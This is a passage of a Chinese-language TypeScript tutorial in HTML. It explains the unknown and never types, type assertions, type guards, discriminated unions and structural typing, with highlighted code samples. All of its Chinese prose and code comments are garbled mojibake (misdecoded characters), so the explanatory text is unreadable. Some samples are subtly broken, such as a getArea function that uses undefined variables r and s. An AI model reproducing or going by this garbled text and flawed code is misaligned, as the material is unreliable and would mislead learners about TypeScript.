ç±»å‹è¯¦è§£</strong></p><p>è®¾è®¡ç›®çš„ï¼šæä¾›ç±»å‹å®‰å…¨çš„é¡¶å±‚å®¹å™¨ï¼Œæ›¿ä»£ any å¤„ç†ä¸ç¡®å®šç±»å‹ã€‚</p><p>æ ‡å‡†ä½¿ç”¨æ¨¡å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. æ¥æ”¶ä¸ç¡®å®šç±»å‹å€¼</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">userInput</span>: <span class="hljs-built_in">unknown</span> = <span class="hljs-title function_">fetchUserInput</span>();<br><br><span class="hljs-comment">// 2. ä½¿ç”¨æ—¶æ˜¾å¼æ–­è¨€</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> userInput === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userInput.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// æ”¶çª„ä¸ºstring</span><br>&#125;<br><br><span class="hljs-comment">// 3. æˆ–ä½¿ç”¨ç±»å‹æ–­è¨€</span><br><span class="hljs-keyword">const</span> parsed = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString) <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span>; <span class="hljs-comment">// å®‰å…¨å®¹å™¨</span><br></code></pre></td></tr></table></figure><p>å·¥ç¨‹å®è·µï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®‰å…¨ååºåˆ—åŒ–å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeParse</span>(<span class="hljs-params"><span class="hljs-attr">json</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">unknown</span> &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(json);<br>  &#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">safeParse</span>(<span class="hljs-string">&#x27;&#123;&quot;name&quot;:&quot;Alice&quot;&#125;&#x27;</span>);<br><span class="hljs-keyword">if</span> (data &amp;&amp; <span class="hljs-keyword">typeof</span> data === <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; <span class="hljs-string">&quot;name&quot;</span> <span class="hljs-keyword">in</span> data) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">name</span>); <span class="hljs-comment">// é€šè¿‡ç±»å‹å®ˆå«å®‰å…¨è®¿é—®</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>never ç±»å‹è¯¦è§£</strong></p><p>è®¾è®¡ç›®çš„ï¼šè¡¨ç¤ºæ°¸è¿œä¸ä¼šå‘ç”Ÿçš„å€¼æˆ–ä¸å¯è¾¾çš„ä»£ç åˆ†æ”¯ã€‚</p><p>æ ¸å¿ƒåº”ç”¨åœºæ™¯ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åœºæ™¯1ï¼šæŠ›å‡ºå¼‚å¸¸çš„å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">error</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message);<br>&#125;<br><br><span class="hljs-comment">// åœºæ™¯2ï¼šæ­»å¾ªç¯å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// åœºæ™¯3ï¼šç©·å°½æ£€æŸ¥ï¼ˆExhaustiveness checkingï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Shape</span> = <span class="hljs-string">&quot;circle&quot;</span> | <span class="hljs-string">&quot;square&quot;</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getArea</span>(<span class="hljs-params"><span class="hljs-attr">shape</span>: <span class="hljs-title class_">Shape</span></span>): <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">switch</span> (shape) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;circle&quot;</span>: <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * r**<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;square&quot;</span>: <span class="hljs-keyword">return</span> s**<span class="hljs-number">2</span>;<br>    <span class="hljs-attr">default</span>: <br>      <span class="hljs-keyword">const</span> <span class="hljs-attr">_exhaustiveCheck</span>: <span class="hljs-built_in">never</span> = shape; <span class="hljs-comment">// è‹¥æ–°å¢shapeç±»å‹ä¼šæŠ¥é”™</span><br>      <span class="hljs-keyword">return</span> _exhaustiveCheck;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»å‹ç³»ç»Ÿç‰¹æ€§ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// never æ˜¯ä»»æ„ç±»å‹çš„å­ç±»å‹</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">n</span>: <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> = n; <span class="hljs-comment">// âœ… ç¼–è¯‘é€šè¿‡</span><br><br><span class="hljs-comment">// ç©ºæ•°ç»„ç±»å‹æ¨æ–­</span><br><span class="hljs-keyword">const</span> emptyArray = []; <span class="hljs-comment">// æ¨æ–­ä¸º never[]</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹é€‰æ‹©æŒ‡å—</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èç±»å‹</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç¬¬ä¸‰æ–¹JSåº“è¿ç§»</td><td align="left">any</td><td align="left">å¿«é€Ÿè¿‡æ¸¡æœŸæ–¹æ¡ˆ</td></tr><tr><td align="left">APIå“åº”è§£æ</td><td align="left">unknown</td><td align="left">å®‰å…¨å¤„ç†åŠ¨æ€æ•°æ®ç»“æ„</td></tr><tr><td align="left">é”™è¯¯å¤„ç†å‡½æ•°</td><td align="left">never</td><td align="left">æ˜ç¡®è¡¨ç¤ºå‡½æ•°ä¸ä¼šæ­£å¸¸è¿”å›</td></tr><tr><td align="left">ç±»å‹å®ˆå«ä¸­ä¸å¯è¾¾åˆ†æ”¯</td><td align="left">never</td><td align="left">è§¦å‘ç©·å°½æ£€æŸ¥</td></tr><tr><td align="left">æ³›å‹ç¼–ç¨‹ä¸­çš„ç©ºé›†åˆ</td><td align="left">never</td><td align="left">è¡¨ç¤ºä¸å¯èƒ½å­˜åœ¨çš„ç±»å‹ï¼ˆå¦‚ keyof never &#x3D; neverï¼‰</td></tr></tbody></table><h3 id="1-1-4-ç±»å‹æ–­è¨€ä¸ç±»å‹å®ˆå«å®ç°åŸç†"><a href="#1-1-4-ç±»å‹æ–­è¨€ä¸ç±»å‹å®ˆå«å®ç°åŸç†" class="headerlink" title="1.1.4 ç±»å‹æ–­è¨€ä¸ç±»å‹å®ˆå«å®ç°åŸç†"></a>1.1.4 ç±»å‹æ–­è¨€ä¸ç±»å‹å®ˆå«å®ç°åŸç†</h3><p><strong>ç±»å‹æ–­è¨€ï¼ˆType Assertionsï¼‰</strong></p><p>æœ¬è´¨ï¼šå¼€å‘è€…å‘ç¼–è¯‘å™¨æä¾›æ›´å…·ä½“çš„ç±»å‹ä¿¡æ¯ï¼ˆä¸æ”¹å˜è¿è¡Œæ—¶å€¼ï¼‰</p><p>ä¸¤ç§è¯­æ³•å½¢å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å°–æ‹¬å·è¯­æ³•ï¼ˆJSXä¸­ä¸å¯ç”¨ï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">strLength</span>: <span class="hljs-built_in">number</span> = (&lt;<span class="hljs-built_in">string</span>&gt;someValue).<span class="hljs-property">length</span>;<br><br><span class="hljs-comment">// as è¯­æ³•ï¼ˆæ¨èï¼‰</span><br><span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;app&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLDivElement</span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åœºæ™¯ï¼š</p><p>(1) DOM å…ƒç´ ç±»å‹ç»†åŒ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;input[type=&quot;text&quot;]&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLInputElement</span>;<br>input.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;new value&#x27;</span>; <span class="hljs-comment">// å®‰å…¨è®¿é—®valueå±æ€§</span><br></code></pre></td></tr></table></figure><p>(2) è”åˆç±»å‹æ”¶çª„</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> ((padding <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>) &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// æ–­è¨€ä¸ºnumber</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.<span class="hljs-title function_">repeat</span>(padding <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>) + value;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (padding <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>) + value;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) å¤„ç†anyç±»å‹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">unknownData</span>: <span class="hljs-built_in">any</span> = <span class="hljs-title function_">fetchData</span>();<br><span class="hljs-keyword">const</span> validData = unknownData <span class="hljs-keyword">as</span> <span class="hljs-title class_">UserData</span>; <span class="hljs-comment">// æ–­è¨€ä¸ºå…·ä½“ç±»å‹</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>æ–­è¨€å¿…é¡»æ»¡è¶³â€ç»“æ„å…¼å®¹â€ï¼ˆå¦‚ä¸èƒ½å°† string æ–­è¨€ä¸º numberï¼‰</li><li>åŒé‡æ–­è¨€è§„é¿é™åˆ¶ï¼ˆæ…ç”¨ï¼‰ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> str = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-keyword">const</span> num = str <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>; <span class="hljs-comment">// ç»•è¿‡ç±»å‹æ£€æŸ¥</span><br></code></pre></td></tr></table></figure><p><strong>ç±»å‹å®ˆå«ï¼ˆType Guardsï¼‰</strong></p><p>åŸç†ï¼šé€šè¿‡è¿è¡Œæ—¶æ£€æŸ¥è§¦å‘ç¼–è¯‘æ—¶ç±»å‹æ”¶çª„</p><p>å†…ç½®å®ˆå«æœºåˆ¶ï¼š</p><table><thead><tr><th align="left">ç±»å‹å®ˆå«</th><th align="left">è¯­æ³•ç¤ºä¾‹</th><th align="left">æ”¶çª„æ•ˆæœ</th></tr></thead><tbody><tr><td align="left">typeof</td><td align="left">typeof val &#x3D;&#x3D;&#x3D; â€œstringâ€</td><td align="left">åŸºæœ¬ç±»å‹ â†’ å…·ä½“ç±»å‹</td></tr><tr><td align="left">instanceof</td><td align="left">obj instanceof Date</td><td align="left">ç±»å®ä¾‹ â†’ å…·ä½“ç±»</td></tr><tr><td align="left">in æ“ä½œç¬¦</td><td align="left">â€œpropâ€ in obj</td><td align="left">å¯¹è±¡ â†’ åŒ…å«è¯¥å±æ€§ç±»å‹</td></tr><tr><td align="left">å­—é¢é‡ç›¸ç­‰æ£€æŸ¥</td><td align="left">status &#x3D;&#x3D;&#x3D; â€œsuccessâ€</td><td align="left">è”åˆ â†’ å…·ä½“å­—é¢é‡ç±»å‹</td></tr></tbody></table><p>ç¤ºä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params"><span class="hljs-attr">val</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// valæ”¶çª„ä¸ºstring</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// valæ”¶çª„ä¸ºnumber</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è‡ªå®šä¹‰ç±»å‹å®ˆå«</strong></p><p>å®ç°åŸç†ï¼šè¿”å›ç±»å‹è°“è¯ï¼ˆarg is Tï¼‰</p><p>æ ‡å‡†æ¨¡å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isString</span>(<span class="hljs-params"><span class="hljs-attr">val</span>: <span class="hljs-built_in">unknown</span></span>): val is <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> val === <span class="hljs-string">&quot;string&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">unknown</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isString</span>(input)) &#123;<br>    input.<span class="hljs-title function_">trim</span>(); <span class="hljs-comment">// inputè¢«æ”¶çª„ä¸ºstring</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤æ‚å¯¹è±¡å®ˆå«å®æˆ˜ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cat</span> &#123; <span class="hljs-title function_">meow</span>(): <span class="hljs-built_in">void</span> &#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> &#123; <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span> &#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCat</span>(<span class="hljs-params"><span class="hljs-attr">animal</span>: <span class="hljs-title class_">Cat</span> | <span class="hljs-title class_">Dog</span></span>): animal is <span class="hljs-title class_">Cat</span> &#123;<br>  <span class="hljs-keyword">return</span> (animal <span class="hljs-keyword">as</span> <span class="hljs-title class_">Cat</span>).<span class="hljs-property">meow</span> !== <span class="hljs-literal">undefined</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleAnimal</span>(<span class="hljs-params"><span class="hljs-attr">animal</span>: <span class="hljs-title class_">Cat</span> | <span class="hljs-title class_">Dog</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCat</span>(animal)) &#123;<br>    animal.<span class="hljs-title function_">meow</span>(); <span class="hljs-comment">// æ”¶çª„ä¸ºCat</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    animal.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// æ”¶çª„ä¸ºDog</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¯è¾¨è¯†è”åˆï¼ˆDiscriminated Unionsï¼‰</strong></p><p>ç‰¹æ®Šç±»å‹å®ˆå«ï¼šé€šè¿‡å…±åŒå­—æ®µè‡ªåŠ¨æ”¶çª„</p><p>å®ç°åŸç†ï¼š</p><ul><li>å®šä¹‰å…·æœ‰ç›¸åŒåˆ¤åˆ«å­—æ®µçš„è”åˆç±»å‹</li><li>é€šè¿‡åˆ¤åˆ«å­—æ®µå€¼æ”¶çª„ç±»å‹</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">NetworkState</span> =<br>  | &#123; <span class="hljs-attr">state</span>: <span class="hljs-string">&quot;loading&quot;</span> &#125;<br>  | &#123; <span class="hljs-attr">state</span>: <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-attr">response</span>: <span class="hljs-built_in">string</span> &#125;<br>  | &#123; <span class="hljs-attr">state</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logState</span>(<span class="hljs-params"><span class="hljs-attr">state</span>: <span class="hljs-title class_">NetworkState</span></span>) &#123;<br>  <span class="hljs-keyword">switch</span> (state.<span class="hljs-property">state</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;loading&quot;</span>:<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Loading...&quot;</span>); <span class="hljs-comment">// state: &#123; state: &quot;loading&quot; &#125;</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;success&quot;</span>:<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(state.<span class="hljs-property">response</span>); <span class="hljs-comment">// state: &#123; state: &quot;success&quot;, response: string &#125;</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;error&quot;</span>:<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(state.<span class="hljs-property">message</span>); <span class="hljs-comment">// state: &#123; state: &quot;error&quot;, message: string &#125;</span><br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>ä¼˜å…ˆä½¿ç”¨ç±»å‹å®ˆå«ï¼šæ¯”ç±»å‹æ–­è¨€æ›´å®‰å…¨ï¼ˆè¿è¡Œæ—¶éªŒè¯ï¼‰</li><li>é¿å…è¿‡åº¦æ–­è¨€ï¼šè¿‡åº¦ä½¿ç”¨ as ä¼šå¼±åŒ–ç±»å‹æ£€æŸ¥</li><li>å®ˆå«å‡½æ•°å¤ç”¨ï¼šæå–å¤æ‚åˆ¤æ–­é€»è¾‘ä¸ºå¯å¤ç”¨å®ˆå«</li><li>å¯è¾¨è¯†è”åˆè®¾è®¡ï¼šé€‚åˆç®¡ç†å¤æ‚çŠ¶æ€æœºç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// çŠ¶æ€æœºç±»å‹å®ˆå«ç¤ºä¾‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">State</span> = &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125; | &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;fetching&#x27;</span>; <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleState</span>(<span class="hljs-params"><span class="hljs-attr">state</span>: <span class="hljs-title class_">State</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (state.<span class="hljs-property">status</span> === <span class="hljs-string">&#x27;fetching&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - state.<span class="hljs-property">startTime</span>; <span class="hljs-comment">// å®‰å…¨è®¿é—®startTime</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-1-5-ç»“æ„åŒ–ç±»å‹ç³»ç»Ÿä¸é¸­å­ç±»å‹"><a href="#1-1-5-ç»“æ„åŒ–ç±»å‹ç³»ç»Ÿä¸é¸­å­ç±»å‹" class="headerlink" title="1.1.5 ç»“æ„åŒ–ç±»å‹ç³»ç»Ÿä¸é¸­å­ç±»å‹"></a>1.1.5 ç»“æ„åŒ–ç±»å‹ç³»ç»Ÿä¸é¸­å­ç±»å‹</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µè§£æ</strong></p><table><thead><tr><th align="left">æœ¯è¯­</th><th align="left">å®šä¹‰</th><th align="left">å¯¹æ¯”æ¨¡å‹</th></tr></thead><tbody><tr><td align="left">ç»“æ„åŒ–ç±»å‹ç³»ç»Ÿ</td><td align="left">ç±»å‹å…¼å®¹æ€§åŸºäºç±»å‹çš„ç»“æ„å±æ€§ï¼ˆè€Œéåç§°ï¼‰</td><td align="left">TypeScript, Go</td></tr><tr><td align="left">åä¹‰ç±»å‹ç³»ç»Ÿ</td><td align="left">ç±»å‹å…¼å®¹æ€§åŸºäºç±»å‹å£°æ˜åç§°ï¼ˆéœ€æ˜¾å¼ç»§æ‰¿ï¼‰</td><td align="left">Java, C#</td></tr><tr><td align="left">é¸­å­ç±»å‹</td><td align="left">â€œå¦‚æœå®ƒèµ°èµ·æ¥åƒé¸­å­ã€å«èµ·æ¥åƒé¸­å­ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯é¸­å­â€ï¼ˆå…³æ³¨è¡Œä¸ºè€Œéå…·ä½“ç±»å‹ï¼‰</td><td align="left">åŠ¨æ€è¯­è¨€å“²å­¦</td></tr></tbody></table><p><strong>ç»“æ„åŒ–ç±»å‹ç³»ç»ŸåŸç†</strong></p><p>åŸºæœ¬è§„åˆ™ï¼š</p><ul><li>ç±»å‹ A å…¼å®¹ç±»å‹ B å½“ä¸”ä»…å½“ A æ‹¥æœ‰ B çš„æ‰€æœ‰å¿…éœ€æˆå‘˜ï¼ˆæˆå‘˜åå’Œç±»å‹åŒ¹é…ï¼‰</li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Vector2D</span> &#123;<br>  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// ç±»æ— éœ€æ˜¾å¼å®ç°æ¥å£ï¼ˆç»“æ„åŒ¹é…å³å¯ï¼‰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Point2D</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">public</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">v</span>: <span class="hljs-title class_">Vector2D</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Point2D</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// âœ… å…¼å®¹</span><br></code></pre></td></tr></table></figure><p>å±æ€§æ£€æŸ¥è§„åˆ™ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// ç›´æ¥èµ‹å€¼å­—é¢é‡æ—¶è§¦å‘ä¸¥æ ¼æ£€æŸ¥</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">p</span>: <span class="hljs-title class_">Person</span> = &#123; <br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-attr">gender</span>: <span class="hljs-string">&quot;female&quot;</span>  <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼å¤šä½™å±æ€§</span><br>&#125;;<br><br><span class="hljs-comment">// é€šè¿‡ä¸­é—´å˜é‡èµ‹å€¼ï¼ˆç»•è¿‡é¢å¤–å±æ€§æ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span 